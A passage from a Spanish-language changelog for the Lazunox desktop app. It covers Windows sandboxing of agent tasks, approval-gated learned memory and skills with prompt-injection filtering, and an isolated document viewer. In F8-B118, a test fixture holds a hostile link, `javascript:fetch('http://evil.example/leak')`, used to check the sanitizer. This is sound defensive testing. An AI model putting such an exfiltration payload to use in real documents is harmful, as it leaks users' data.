- **Guardias**: `src/test/identity-freeze.test.ts` («identidad Lazunox»: nombres, sal criptográfica, pin del certificado coherente en install.sh, su test, make-cask, cask e INSTALAR.md, `SITE_ORIGIN` === `CLOUD_ORIGIN`); nueva `src/test/no-legacy-name.test.ts` + `src/test/legacy-name-allowlist.ts` (el nombre anterior solo aparece en excepciones con motivo; una excepción obsoleta falla); E2E `identity` (sin particiones antiguas) y nuevo `clean-start` (userData vacío: asistente con «Lazunox», sin claves de localStorage ni rutas con el nombre viejo).
- **Versión** 0.5.0 en `package.json` y `package-lock.json`; docs, `AGENTS.md` y `CLAUDE.md` con la regla nueva («INTERNAL_NAME/APP_ID no se cambian sin plan de migración»).

## F8-B104 — Tareas en Windows: política de carpetas, batería de ataques A1–A20 en macOS y guardia del informe (bandera sigue apagada)

Sin cambio de comportamiento en macOS ni con `TASKS_WIN_BUILD = false`. Trabajo defensivo sobre el sandbox propio de Tareas.

- **Política de carpetas de Windows** (`src/main/tasks/folder-policy-win.ts`, zona INTOCABLE; `folder-policy.ts` despacha por plataforma): lista cerrada y falla cerrado. Raíces de unidad, `Windows`/`Program Files*`/`ProgramData`/`$Recycle.Bin`/`System Volume Information` en cualquier unidad, `Users` salvo el perfil propio, perfil completo y sus ancestros, TODO `AppData`, claves y credenciales del perfil, userData de Lazunox y rutas extra (y sus ancestros), UNC y `\\?\`, unidades no fijas, `subst`, y carpetas con enlaces simbólicos o junctions (en la ruta o dentro). Sin contexto de Windows o sin poder leer las unidades no se aprueba nada. `win-drives.ts` lee las unidades con `execFile` inyectado (3 s, caché de 30 s).
- **Batería** `win-attack.battery.test.ts`: A1–A20 contra `resolveUiPath`, el mapa de rutas, `checkNoLinks` y la política (plataforma inyectada); lo que exige Windows real figura como `pc` con su motivo.
- **Informe** `tasks-win-report.ts` (esquema 1, evaluación estricta) y `tasks-win-report.guard.test.ts`: con la bandera en `true` exige ambos informes en verde, con hashes de los archivos de aislamiento iguales a los actuales y pines coincidentes; la bandera debe ser un literal y `LAZUNOX_TASKS_WIN` solo se lee en `tasks-win-flag.ts`.
- **Pendiente**: cablear el contexto de Windows en `manager.ts` (W6) y ejecutar la batería en el PC; `docs/SEGURIDAD.md` y `AGENTS.md` los redacta W10 con el informe real.

## F8-B105 — Tareas en Windows: backend WSL fail-closed, política de carpetas cableada, bandera propagada y estado del entorno en la interfaz (bandera sigue apagada)

Sin cambio de comportamiento en macOS ni con `TASKS_WIN_BUILD = false` (Windows queda exactamente como antes: sin modo Tareas, sin canales, sin backend). Todo probado en macOS con la plataforma inyectada; lo que exige Windows real queda como pendiente.

- **W5, `selectBackend`/`startTasksServer`** (cierra H1; A18 pasa a cobertura completa): `selectBackend('win32')` ya no devuelve `none`; lanza `WinBackendUnavailable` salvo con `tasksWin`, `TASKS_WIN_BUILD` (se repite la comprobación aquí), informe del PC en verde y backend creable (`backends/win-provider.ts`: pin, carga, `%LOCALAPPDATA%`; deps reales de `wsl.exe` y red solo 127.0.0.1). `startTasksServer` rechaza `noSandbox` en win32, exige backend `wsl` y `status() === 'ready'` (`TasksSandboxNotReady`) antes de abrir proxies o procesos; el servidor expone `paths` (mapa y directorio dentro de la distro). Equivalencia de Seatbelt sin regenerar el fixture. Pruebas: `select-backend`, `sandbox.win`, `win-provider`, batería A18.
- **W6, gestor**: `TasksManager` con plataforma y contexto inyectables. En win32: `normalizeFolder` con `realpath.native` y `resolveUiPath`; política de `folder-policy-win` con unidades (`win-drives`), perfil, instalación de Lazunox, distro y enlaces reales (`win-context.ts`; sin contexto o con unidades caducadas > 120 s rechaza todo); rutas de red o de dispositivo se rechazan SIN tocar disco; `assertInsideApproved` por `isApprovedPath` (traducir no autoriza); reescaneo de enlaces al arrancar; Control total inexistente en `main` (`merr.task.fullAccessUnavailable`, también concesiones antiguas en disco). Archivos: ZIP con `tar.exe`, `tasks:quickLook` solo macOS, `textutil` solo macOS, `importFilesInto` con `isInside` (H11, H12). `inline-config` concede las carpetas vinculadas con su ruta dentro de la distro (H7).
- **W7, propagación**: `main/index.ts` calcula `tasksWin` con `resolveTasksWin` y la reparte (caps, argumento `--lazunox-caps` del preload de la ventana principal, handlers, proveedor del backend). Sin `caps.computer` no se construye ni se cablea `computer:*` (H2; `ipc/tasks-computer-wiring.ts`). El renderer consulta capacidades siempre con `currentFlags()` (guardia `src/test/tasks-win-wiring.test.ts`). Ajuste `tasksWinBeta` (solo `main` lo lee al arrancar; clase X para el celular). `TasksConnection`/`LiveServer` llevan `directory`/`pathMap`; monitor, auto-aprobador y rutinas hablan con OpenCode con ese directorio.
- **W8, interfaz**: canales `tasks:sandbox:status|setup|cancel` y evento `tasks:sandbox:progress` (`TasksSandboxService`, esquema estricto, status R y setup/cancel X para el celular). Tarjeta `SandboxSetupCard` (por instalar, actualizar, instalando con progreso, fallo con motivo traducido, guías de WSL, política, no disponible, roto): solo los botones que hacen algo, y el compositor se bloquea mientras el entorno no esté listo. Sin Control del PC no hay selector de acceso, categoría de control ni consejo de Control total; sin Vista rápida.
- **W9, textos**: claves `tasks.sandbox.*`, `tasksSettings.beta.*` y variantes `.win` (Explorador, aislamiento, mantener el PC despierto). `win-shortcut-text` deja de eximir por prefijo `tasks.`/`tasksComputer.` y exime solo cuatro claves de Control total. El PWA no cambia (`i18n-core-keys.json` intacto; las claves nuevas viven en pantallas perezosas).
- **Pendiente**: imagen Debian (pin `wsl-rootfs` y empaquetado de `resources/wsl`, `pin.json` y los informes), pruebas en el PC (batería con los informes de las dos sesiones, junctions/drvfs reales, unidades de red y `subst`), ruta de directorio en `actions.ts`/`store.ts`/`util.ts`/`transcript.ts`/`FolderRequestCard.tsx` del renderer (H5, H6), `storage.ts` sin `du` (H11) y `docs/SEGURIDAD.md`/`AGENTS.md` (W10, con el informe real).

## F8-B106 — Tareas en Windows: renderer con rutas del sandbox, almacenamiento sin `du`, «Volver a comprobar» con `force` y documentación (bandera sigue apagada)

Sin cambio de comportamiento en macOS (en cada consumidor la ruta del sandbox es la propia carpeta; hay casos «macOS = identidad»). `TASKS_WIN_BUILD` sigue en `false`.

- **Renderer (H5, H6)**: `directory:` de todas las llamadas al SDK, las comparaciones `session.directory === folder`, las claves de sesiones del store y la lista de tareas usan `conn.directory` (`impl/path-map.ts` puro y `impl/conn-paths.ts`). Permisos, tarjeta de otra carpeta, actividad, panel de progreso y exportación a Markdown muestran `C:\…`. A `main` siguen llegando las rutas tal cual: traducir no autoriza.
- **`storage.ts` (H11)**: sin `du` en win32 (recorrido con Node, sin seguir enlaces, con topes) y plataforma inyectable.
- **`tasks:sandbox:status { force }`**: «Volver a comprobar» se salta la caché de 5 s de `main`.
- **Documentación (W10)**: `docs/SEGURIDAD.md` §3 quadragies quater y `AGENTS.md` (modelo, estado, nuevas zonas intocables).
- **Pendiente**: imagen Debian fijada y empaquetada, batería A1–A20 en el PC (guion `tasks-attack.ps1`, informes de las dos sesiones), decisiones D2/D4 del dueño.

## F8-B107 — Decisión del dueño (2026-10-07): Tareas y Control del PC en Windows como beta opcional (WP0, solo documentación)

Sin código. El dueño decidió expresamente ofrecer Tareas y Control del PC en Windows como **beta opcional**, con la imagen incluida en el instalador
(`resources\wsl\images`) y **sin publicar nada**. Registro en `AGENTS.md` (§7 y §8), `docs/SEGURIDAD.md` (§3 quadragies quater y quinquies: de «apagado»
a «beta opcional»), `docs/WINDOWS-TAREAS.md` y `docs/ROOTFS-BUILD-2026-10-06.md`.

- **Verificado (PC real):** `attack_suite.py` (38 pruebas, batería parcial) y sesión real 2/2 (`wsl-it.ps1`: setup, `ready`, uid 1000, `CapEff=0`, `NoNewPrivs=1`, montajes `noexec,nosuid,nodev`, `case=off`); aislamiento de la distro (Landlock, sin red salvo el proxy, sin SUID, sin interop ni unidades).
- **NO verificado (sin eufemismos):** batería A1–A20 completa y dos sesiones (elevada y normal); WSL#12443; A3 (symlink NTFS); imagen y OpenCode sin firma de terceros; sin auditoría externa. Control del PC: SendInput, UIA, capturas con máscara, STOP/EOF, Defender y SmartScreen.
- **La guardia de informes se sustituye** por la puerta de beta consentida: consentimiento propio escrito solo por `main` (versionado y revocable) + huella del paquete + distro `ready` + política `disableWslTasks`. La huella es integridad contra corrupción, no contra un atacante local con permiso de escritura. `tasks-win-report.ts` queda archivado.
- **Se conserva** el camino de descarga (falla cerrado con 404 mientras la imagen no esté publicada).
- **Respuestas del dueño:** (1) Tareas se niega a arrancar si Lazunox corre elevado, como Control del PC; (2) solo se avanza de versión de imagen, no se reinstala una anterior; (3) la URL de `wsl-rootfs` mantiene la forma del repo `onyxcode-cl/lazunox-wsl` aunque no esté publicada, sin relajar `parseWslPin`.
- `TASKS_WIN_BUILD` sigue en `false` hasta su commit aparte (último paquete del plan). Nada de esto está probado en un Windows real más allá de lo listado como verificado.

Prueba: documentación; `npx vitest run src/test` (guardias de texto).

## F8-B108 — Desinstalador de la distro de Tareas y topes de tamaño con la imagen incluida (WP7, WP8)

- **`build/installer.nsh` (`customUnInstall`)**: pregunta (NO por defecto) si quitar la distro `Lazunox-Tareas`; en silencioso (`/S`) y en actualizaciones (`--updated`) no toca nada. Antes comprueba con `wsl.exe -l -q` (UTF-16LE, normalizado con PowerShell: se quitan los NUL y se compara el nombre exacto) que existe; ejecuta solo `wsl.exe --unregister Lazunox-Tareas` con límite de tiempo y, si salió con 0, borra `%LOCALAPPDATA%\Lazunox\wsl`. Nunca `--shutdown`, ni docker-desktop, ni la distro antigua. Sin `wsl.exe`, se salta sin error. **No compilado con makensis ni probado en Windows.**
- **Pruebas**: guardia estática en `scripts/win-cu-scripts.test.mjs` sobre el texto del `.nsh` (4 pruebas); `scripts/win/pack-check.ps1 -Install` comprueba que la desinstalación silenciosa no cambia la lista de distros de WSL (no crea distros).
- **Tamaño (WP8)**: revisados `ZIP_MAX_BYTES`, `winUncompressedCap`, `MAX_ENTRIES` y el espacio libre del actualizador frente a ~135 MB incompresibles de `resources\wsl\images`: ninguno se rompe, no se cambió ninguno. Dos pruebas nuevas en `src/test/update-scripts-win.test.ts` (ZIP con `resources/wsl/images` reproducible y verificable; aritmética de topes). `pack-check.ps1`: tamaño razonable del instalador de 400 a 520 MB. `docs/DISTRIBUCION.md` §12.1: tamaño esperado y que `swap.ps1` no debe encontrar nada abierto bajo `resources\wsl\images`. El tamaño real no está medido.

## F8-B109 — Barra lateral de escritorio 2c (sustituye a la 1b)

- **Estructura**: cabecera con «Ocultar», marca (logo de la app + nombre), «Nueva …» con su atajo, buscador como campo, segmentado de modos (sigue siendo `nav[aria-label="Modo"]` con botones y `aria-current="page"`; respeta `MODES`), lista como `role="tree"` (proyecto con sesiones anidadas, guía de 1 px, punto de estado de 7 px, «Aprobar»/«Trabajando» en texto, menú «⋯» con clic derecho), «Sin proyecto» en Chat, pie con Ajustes · Ayuda · Tema · estado. Teclado ↑ ↓ ← → Inicio Fin (`components/SidebarTree.tsx`).
- **Colapsada de 56 px** con tooltips a la derecha (hover y foco). El botón «Mostrar barra lateral» ahora vive en la barra (columna de iconos; la franja `drag` superior es hermana de los botones) y ya no flota al final de `<main>`; `--header-inset` pasa a 24 px en macOS (semáforos) y 0 en Windows/Linux.
- **Sin cambios fuera de escritorio**: roles y elementos nuevos solo existen dentro de `SidebarTreeRoot` (contexto); el marcado del celular y las guardias de «escritorio sin cambios» no cambian. Sin colores ni tokens nuevos (`--sidebar-width` 256 → 272 px en `desktop/shell.css`). No cambia `i18n-core-keys.json`.
- **Pruebas**: `Sidebar.render.test.tsx`, `SidebarTree.test.tsx`, `ChatSessionList.tree.render.test.tsx`, `sidebar.tree.render.test.tsx`. Capturas: `scripts/shot-desktop.mjs --clip sidebar` y escenarios `barra-chat`, `barra-code`, `barra-code-hover`.

## F8-B110 — Ajustes en Windows: la fila beta de Tareas se veía tapada por el aviso viejo

- `GeneralSection.tsx`: cuando la beta de Tareas existía sin activar, la fila «Tareas (beta) en Windows» quedaba debajo del aviso «No disponible en Windows por ahora», que además decía que Tareas «todavía no está disponible» (texto viejo, de antes de la beta). Se reordenó para mostrar primero la fila y se corrigieron los textos `platform.win.unavailable.*` (es/en).
- Verificado con una captura real en el PC de pruebas (`scripts/win/remote-shot.mjs`, sección `General`): el interruptor sale visible de entrada.
- Superado horas después por F8-B111 (se quita la beta por completo).

## F8-B111 — Se quita el consentimiento beta de Tareas/Control del PC en Windows: «no quiero nada beta»

- **Decisión expresa del dueño, 2026-10-07 (tarde)**: tras ofrecerlas como beta opcional (F8-B107), el dueño pidió quitar el consentimiento por completo. Tareas y Control del PC quedan **activos de entrada en Windows**, igual que en macOS; no hay interruptor ni aviso que aceptar.
- **Borrado**: `tasks-win-beta-consent.ts`, `ipc/tasks-beta-handlers.ts`, `TasksWinBeta.tsx` (+ pruebas), el canal IPC `tasks:winBeta`, los tipos `TasksWinBetaAction`/`TasksWinBetaState`, el campo `settings.tasksWinBeta`, y las claves i18n `tasksSettings.beta.*`.
- **`resolveTasksWin`** (`tasks-win-flag.ts`) queda `win32 && TASKS_WIN_BUILD && !policy.disableWslTasks`: ya no depende de ningún consentimiento ni de `LAZUNOX_TASKS_WIN`.
- **`win-provider.ts` `gate()`** pierde el primer eslabón (consentimiento releído del disco); el resto sigue igual: no elevado, pin, huella del paquete incluido, carga, `state.json`, política.
- **NO se tocó** el consentimiento de la tarjeta de Control del PC (`computer-win-consent.json`, equivalente a TCC, por acción): sigue siendo la protección real de cada herramienta, igual que antes.
- `GeneralSection.tsx`/`ComputerSection.tsx`: Windows ahora muestra Tareas/Control del PC igual que macOS cuando `caps.tasks` es verdad; el aviso `platform.win.unavailable.*` queda solo para cuando la política de la organización los bloquea.
- Lo que **no cambia**: la batería A1–A20 sigue incompleta y los informes de dos sesiones no existen; eso ya no bloquea el arranque, solo sigue pendiente de probar.
- Pruebas: `win-provider.test.ts`, `tasks-win-flag.test.ts`, `unsupported-handlers.test.ts`, `tasks-handlers.nocomputer.test.ts`, `tasks-win-wiring.test.ts`, `i18n-coverage.test.ts`, `win-attack.battery.test.ts` reescritas sin consentimiento. Batería completa: 5855 pruebas verdes.

## F8-B112 — Memoria aprendida (tanda 1): el agente propone, el usuario aprueba

- **Decisión del dueño, 2026-10-07**: de las 3 diferencias con Hermes Agent (siempre encendido / canal de
  mensajería / autonomía de aprendizaje) se avanza SOLO con la última, y **local** (sin servidor, sin canal de
  mensajería). Hallazgo del plan: Lazunox YA tenía dos autonomías silenciosas (`.lazunox/memoria.md` y
  `.opencode/skills/` escritos por el agente sin aprobación); esta tanda las sustituye para la memoria.
- **El agente nunca escribe memoria.** Termina el turno con un bloque ` ```lazunox-memoria``` ` (hasta 5
  propuestas); `MemoryProposalCard` las muestra bajo el último mensaje con casilla editable (nada preseleccionado
  si hay aviso de dato personal/inyección); solo al aprobar, `main` escribe. `src/shared/memory-proposal.ts`
  (extracción + filtro de secretos/inyección, puro) y `src/shared/memory-format.ts` (formato del archivo, tope de
  entradas, ida y vuelta, puro).
- **Vive en `userData/memoria/`** (global `usuario.md` + `proyectos/<slug>-<hash>.md`), NUNCA en la carpeta del
  proyecto: el sandbox ya deniega `userData`, así que el agente no puede tocarla aunque quisiera, sin tocar
  `sandbox-profile.ts`. `src/main/tasks/learned-memory.ts` revalida todo de nuevo (nunca confía en el renderer).
  La memoria vieja de `.lazunox/memoria.md` sigue funcionando en SOLO LECTURA (`resources/opencode/agents/tasks.md`
  reescrito: el agente ya no la edita ni la crea).
- **IPC nuevo** `tasks:learn:{get,accept,remove,clear}`, todo clase `X` en el control remoto (nunca desde el
  celular). Ajuste `learningEnabled` (Ajustes › General, `true` por defecto, decisión del dueño), también `X`.
- `INJECTION_PATTERNS`/`looksLikeInjection` se mueven de `src/main/tasks/auto-mode.ts` a
  `src/shared/injection-patterns.ts` (sin cambiar ninguna regex) para poder reutilizarlos desde el renderer.
- **UI**: tarjeta en la conversación de Tareas; sección "Memoria aprendida de este proyecto" en `ProjectPanel`
  (listar/borrar una nota/borrar todas); interruptor + "Borrar toda la memoria global" en Ajustes › General.
- **Planificado por un agente con Opus** antes de tocar código (cambio de arquitectura); los módulos puros
  (`memory-format.ts`, el movimiento de `injection-patterns.ts`) se delegaron a Haiku y se verificaron de nuevo.
- **Pendiente (tanda 2, no en este commit)**: skills propuestas con tarjeta (hoy `CREATE_SKILL_PROMPT` y la
  grabación de skills siguen escribiendo directo, sin pasar por aprobación); memoria desde Rutinas (hoy
  suprimida del todo); detección de edición externa de los `.md` de memoria; memoria para modo Code.
- Pruebas nuevas: `memory-format.test.ts` (27), `memory-proposal.test.ts` (15), `injection-patterns.test.ts` (9),
  `learned-memory.test.ts` (14), `MemoryProposalCard.test.ts` (5), más `tasks-prompt.test.ts` ampliado. Batería
  completa: 5969 pruebas verdes, typecheck limpio (node/web/pwa), lint sin errores.

## F8-B113 — Memoria aprendida (tanda 2): skills propuestas, mismo patrón que la memoria

- Cierra el otro hueco silencioso que encontró el plan de F8-B112: "Crear skill de esta tarea" y la skill
  grabada por demostración escribían `.opencode/skills/<nombre>/SKILL.md` directo (la segunda, con un paso
  de confirmación por la herramienta `question`, pero sin pasar por la app ni por los filtros de secretos).
- **El agente ya no escribe la skill.** Los dos prompts (`CREATE_SKILL_PROMPT` en `transcript.ts` y
  `buildRecordedSkillPrompt` en `skill-recording.ts`) ahora piden terminar el turno con un bloque
  `lazunox-skill` ({name, description, body}, agentskills.io). `SkillProposalCard` lo muestra editable
  (nombre, descripción, contenido) bajo el último mensaje; solo al pulsar «Guardar skill» se llama a
  `tasks:skill:accept` y `main` escribe. `src/shared/skill-proposal.ts` (extracción + filtros, puro) y
  `src/main/tasks/learned-skills.ts` (escritura, revalida todo, nunca sobrescribe una skill existente: el
  usuario cambia el nombre).
- IPC nuevo `tasks:skill:accept`, clase `X` en el control remoto.
- Pruebas nuevas: `skill-proposal.test.ts` (27), `learned-skills.test.ts` (24), `SkillProposalCard.test.ts`
  (5). Batería completa: 6026 pruebas verdes, typecheck limpio, lint sin errores.
- **Pendiente**: detectar skills que queden escritas en `.opencode/skills/` sin pasar por esta tarjeta
  (ediciones manuales o de una versión anterior) y ofrecer revisarlas; memoria/skills desde Rutinas; memoria
  para modo Code. Nada de esto se tocó en este commit.

## F8-B114 — Memoria/skills desde Rutinas: cola de pendientes de revisar (y un fix de seguridad)

- **Fix de seguridad, no un detalle visual**: `perform()` del planificador guardaba el texto final de la
  rutina (incluyendo el bloque crudo ` ```lazunox-memoria``` `/` ```lazunox-skill``` ` si lo había) en
  `record.summary`, que llega a `routines.json`, la notificación nativa, el historial (Markdown) y el evento
  `routines:run` — que es `allow` en `CELULAR_EVENTS` y por lo tanto **llegaba al celular**. Ahora el bloque se
  quita SIEMPRE del resumen, en los tres modos (chat/code/tasks), proponga memoria o no.
- **Antes**: una rutina (ejecución desatendida, nadie mirando) tenía prohibido proponer memoria nueva. **Ahora**:
  en modo Tareas, con «Aprender de las tareas» encendido, sí puede proponer — pero en vez de una tarjeta que
  nadie vería, queda en una cola de pendientes (`userData/memoria/pendientes.json`, hasta 30 ítems, FIFO:
  los más viejos se descartan si se llena) para revisar cuando el dueño vuelva a abrir la app. Chat/Code
  nunca tuvieron esta sección del prompt (`learningSupported: false` para esos modos).
  `src/shared/learned-pending.ts` (cola, puro) + `src/main/tasks/learned-pending.ts` (lectura/escritura,
  dedup contra lo ya guardado y lo ya pendiente, revalida la carpeta igual que cualquier aprobación).
  Un ítem puede traer memoria Y skill a la vez (si el prompt de la rutina pedía las dos cosas en el mismo
  turno): se aprueban o descartan por separado (`resolvePart`), sin perder la otra mitad.
- **UI**: `PendingLearnedReview` arriba de la lista en Rutinas (reutiliza `LearnedProposalList` y
  `SkillProposalFields`, extraídos de `MemoryProposalCard`/`SkillProposalCard` sin cambiarles el
  comportamiento); aviso "N pendientes · Revisar" en Ajustes › General; si la misma propuesta ya está en la
  tarjeta en vivo de una tarea Y en la cola de pendientes (la rutina reutilizó esa sesión), la tarjeta en vivo
  se oculta para no duplicar la revisión.
- IPC nuevo `tasks:learn:pending:{list,acceptMemory,acceptSkill,discard,discardAll,ackDropped}` + evento
  `tasks:learn:pending:changed`, todo clase `X`/`deny` en el control remoto (nunca al celular).
  `resources/opencode/agents/tasks.md` corregido de paso: "Crear skill de esta tarea" nunca permitía que el
  agente escribiera el archivo él mismo, pero la instrucción se podía leer como una excepción — ahora es
  explícita.
- Pruebas nuevas: `learned-pending.test.ts` (18 en `shared`, 17 en `main`), `service.learning.test.ts` (3,
  verifica con un cliente OpenCode simulado que el resumen real de `perform()` nunca lleva el bloque crudo),
  `tasks-prompt.test.ts` ampliado. Batería completa: 6083 pruebas verdes (23 omitidas, solo-Windows),
  typecheck limpio (node/web), paridad es/en de i18n verificada.
- **Pendiente**: memoria para modo Code (Parte B del plan: prompt global compartido, sin alcance de proyecto
  en v1, requiere una prueba manual con el motor real para confirmar que `system` llega al modelo). Nada de
  esto se tocó en este commit.

## F8-B115 — Memoria aprendida en Code (Parte B): primera versión, solo memoria global

- **Mismo almacén que Tareas, pero solo alcance `usuario`.** Code no tiene el concepto de carpeta aprobada
  de Tareas, así que no hay dónde validar una memoria "de este proyecto" todavía: cualquier propuesta
  `alcance: 'proyecto'` se descarta antes de mostrarla (`CodeMemoryProposalCard`, `src/shared/code-prompt.ts`).
  Reutiliza el interruptor `learningEnabled` (Ajustes), ahora con texto que menciona Tareas y Code.
- **El `system` nunca se manda desde el celular.** `PROMPT_KEYS` en `remote/policy.ts` no incluye `system`:
  si el celular armara uno igual con su copia local de la memoria/ajustes, sería una forma de colar
  instrucciones con el peso de "sistema" sin pasar por la aprobación del dueño en el Mac/PC. `doSend`
  (`features/code/impl/store.ts`) solo construye `system` con `!isRemoteSurface()`; verificado con un cliente
  simulado (`store.system-prompt.test.ts`), no con el motor real (ver pendiente).
- **Refactor de paso, sin cambiar comportamiento**: `lastAssistantEntry`/`lastAssistantText` (antes en
  `tasks/impl/EscalateCard.tsx`/`transcript.ts`) se movieron a `lib/conversation/entries.ts` (puro,
  compartido), re-exportadas desde ambos archivos para no romper a quien las importaba de ahí. Code las usa
  directo, sin importar de `tasks/impl`.
- El bloque ` ```lazunox-memoria``` ` se quita de los mensajes de Code igual que en Tareas
  (`MessageStream.tsx`/`buildBlocks`): es un contrato con el agente, no texto para leer.
- Pruebas nuevas: `code-prompt.test.ts` (4), `CodeMemoryProposalCard.test.ts` (4, incluye el filtro de
  `alcance: 'proyecto'`), `learned-memory-store.test.ts` (6), `store.system-prompt.test.ts` (3, verifica que
  el `system` lleva la memoria con el aprendizaje encendido, el aviso con el aprendizaje apagado, y que
  nunca se manda desde el celular). Batería completa: 6100 pruebas verdes (23 omitidas, solo-Windows),
  typecheck limpio (node/web), lint y formato sin errores.
- **No verificado**: que el `system` realmente llegue al modelo a través del motor real (esta batería solo
  verifica el payload que construye el renderer, con un cliente simulado) — falta una prueba manual con el
  motor conectado. Tampoco se tocó la Parte de Rutinas en modo Code (las rutinas en modo `code`/`chat` nunca
  tuvieron la sección de memoria del prompt, ver F8-B114).

## F8-B116 — Visor de documentos: base aislada (Fase 0 del plan maestro)

- **Función nueva**: en modo Tareas, PDF/Word/Excel/PowerPoint se abren DENTRO de la app con calidad real
  (no un hueco al visor del sistema). Arquitectura de aislamiento calcada del patrón ya existente de
  `src/main/extras/artifact-window.ts`.
- **Esquema privilegiado nuevo** `lazunox-viewer://` en `src/main/security/app-protocol.ts` (D1, zona
  intocable: solo se añadió una entrada a la llamada ya existente de `registerSchemesAsPrivileged`, que
  solo puede invocarse una vez por proceso; `RENDERER_CSP` y `handleAppScheme` sin tocar).
- **Módulo nuevo `src/main/viewer/`**: `session.ts` (sesión aislada, partición en memoria `doc-viewer`,
  sin persistencia, `webRequest` cancela todo lo que no sea el propio esquema, permisos denegados,
  descargas bloqueadas); `scheme.ts` (sirve `lazunox-viewer://viewer/…`: estáticos del visor y
  `/doc/<token>`, que **revalida la carpeta aprobada cada vez que sirve bytes**, nunca confía en la
  validación que hizo la apertura); `tokens.ts` (token aleatorio de 256 bits, uno solo activo a la vez, se
  revoca al abrir otro); `doc-kind.ts` (detecta el tipo por extensión + bytes mágicos `%PDF-`/`PK\x03\x04`,
  con topes de tamaño por tipo); `view.ts` (ciclo de vida de una `WebContentsView` sandboxeada sin preload,
  navegación y ventanas emergentes bloqueadas con `will-navigate`/`will-redirect`/`will-attach-webview`/
  `setWindowOpenHandler`).
- **IPC nuevo** `src/main/ipc/tasks-viewer-handlers.ts`: canales `tasks:viewer:open/attach/close` + evento
  `tasks:viewer:event`, todo clase `'X'` en `src/main/remote/policy.ts` (máxima restricción: es una vista
  nativa de la ventana del Mac que lee bytes de cualquier archivo autorizado).
- **Capacidad nueva** `docViewer` en `src/shared/platform-caps.ts` (`true` en Mac/Windows con Tareas,
  `false` en remoto).
- **UI**: pestaña «Documento» nueva en el panel lateral de Tareas (`TasksWorkspace.tsx`), con hook propio
  `useViewerViewport.ts` y panel `DocumentViewerPanel.tsx`; `Deliverables.tsx` ahora abre pdf/docx/xlsx/pptx
  en el visor nuevo en vez del `PreviewDialog` viejo cuando `platformCaps().docViewer` es verdad.
- **Build propio**: `src/viewer/` (React aparte) con `vite.viewer.config.ts`/`tsconfig.viewer.json`, salida
  en `out/viewer/`, servida SOLO por el esquema nuevo (nunca por el esquema de la app principal).
- i18n: `src/shared/i18n/{es,en}/viewer.ts` + claves `merr.viewer.*`.
- **Verificado**: typecheck node/web/viewer limpio; batería completa de vitest en el VPS de CI aislado (no
  en el Mac, por la regla de carga del equipo), ~6176 pruebas, sin regresiones reales (dos fallos
  «conocidos»: uno es el flaky documentado por contención de CPU, el otro un artefacto de sincronización
  del VPS, no del código).
- **Pendiente**: falta un «spike» a mano, con la app real corriendo, de que un module worker carga bien
  desde el esquema nuevo — eso no se puede verificar desde el entorno del agente, queda para el dueño.

## F8-B117 — Visor de PDF con PDF.js (Fase 1)

- Paquete `pdfjs-dist@^6.4.299` (Apache-2.0, cero dependencias transitivas). `src/viewer/pdf/PdfViewer.tsx`
  nuevo, usando `PDFViewer`/`EventBus`/`PDFLinkService`/`PDFFindController` de
  `pdfjs-dist/web/pdf_viewer.mjs`: carga perezosa de páginas, zoom (50–400%, pasos fijos en el módulo puro
  nuevo `src/viewer/zoom.ts`), navegación de páginas, buscar.
- El worker de pdf.js y sus assets binarios (cmaps, fuentes estándar, wasm, perfiles de color,
  decodificadores de imagen, ~4.5 MB) se copian al build con un script nuevo
  `scripts/copy-pdfjs-assets.mjs`, encadenado en `npm run build:viewer`.
- Enlaces externos de un PDF quedan inertes: bloqueados por `view.ts` de la F0 (defensa ya existente, no
  hizo falta tocar nada nuevo).
- **Pruebas nuevas** para cerrar un hueco que había quedado pendiente de la F0: `src/main/viewer/
scheme.test.ts` (7: token válido sirve bytes con headers correctos; token inventado o revocado → 404; la
  carpeta deja de ser válida al servir aunque el token siga activo → 404; archivo más grande que el tope →
  413; método distinto de GET → 404; host distinto → 404; ruta con «..» → 404); `src/main/viewer/
session.test.ts` (4: solo el esquema propio pasa por `webRequest`, cualquier otro destino se cancela,
  permisos y descargas bloqueados); `src/main/viewer/view.test.ts` (4: will-navigate/will-redirect/
  will-attach-webview prevenidos, window.open negado, el rect de `attach()` se aplica escalado por zoom,
  Escape se reenvía como evento). Más `src/viewer/zoom.test.ts` (9).
- **Verificado**: build de producción del visor genera el worker y copia los assets correctamente; batería
  completa en el VPS sin regresiones reales.

## F8-B118 — Visor de Word con docx-preview (Fase 2)

- Paquete `docx-preview@^0.4.1` (Apache-2.0) + su dependencia `jszip`. `src/viewer/docx/DocxViewer.tsx`
  nuevo: pide el documento por `fetch` al esquema del visor, renderiza con `renderAsync` (`useBase64URL:
true` para que las imágenes queden embebidas sin depender de `blob:` en la CSP; páginas separadas,
  encabezados/pies/notas al pie y al final activados).
- **Segunda capa de defensa** después del render (la primera es la CSP del visor, que ya bloquea toda red
  saliente salvo el propio esquema): `src/viewer/docx/sanitize.ts` (`sanitizeDocxDom`) corre sobre el DOM
  ya renderizado asumiendo que el documento es hostil — deja todo `<a>` inerte (sin `href`, sin importar a
  dónde apunte), saca `src`/`poster`/`srcset`/etc. que no sean `data:`, elimina `<script>`/`<iframe>`/
  `<object>`/`<embed>`/`<link>`/`<meta>`/`<form>` del árbol, saca atributos `on*`, limpia `url(http://…)`
  dentro de `style` inline y de bloques `<style>` del propio documento (deja `url(data:…)` intacto). 10
  pruebas unitarias con `happy-dom` (devDependency nueva) cubren cada caso, incluida la idempotencia.
- **Tipografías sustitutas empaquetadas** (decisión D9 del plan maestro, para que un .docx se vea igual en
  Mac y Windows sin tener Office instalado): Carlito↔Calibri y Caladea↔Cambria (`@fontsource/carlito`/
  `@fontsource/caladea`, OFL-1.1) y Liberation Sans↔Arial, Liberation Serif↔Times New Roman
  (`@typopro/web-liberation`, OFL-1.1). Declaradas con `@font-face` en `src/viewer/styles.css` con
  `local()` primero (si el sistema tiene la original de Microsoft, la usa). Script nuevo
  `scripts/copy-docx-fonts.mjs` las copia a `out/viewer/assets/fonts/`, al lado del CSS compilado (los
  `url()` de CSS se resuelven relativos al propio archivo CSS, a diferencia de las rutas de pdf.js que son
  relativas a la página). Licencias documentadas en `THIRD_PARTY_NOTICES.md`.
- Fixtures nuevas en `src/viewer/__fixtures__/`: `sample.docx` (generado con la skill `docx` existente) y
  `hostile.docx` (el mismo documento con un hipervínculo externo
  `javascript:fetch('http://evil.example/leak')` inyectado a mano para probar el saneado). Prueba de
  extremo a extremo `src/viewer/docx/fixtures.test.ts` (3): pasa ambos fixtures por el renderizador REAL de
  `docx-preview` (bajo **jsdom**, no happy-dom: se comprobó que `docx-preview` no renderiza ningún hijo
  dentro de `<article>` bajo happy-dom, ni con un .docx real de Word, es una limitación de esa
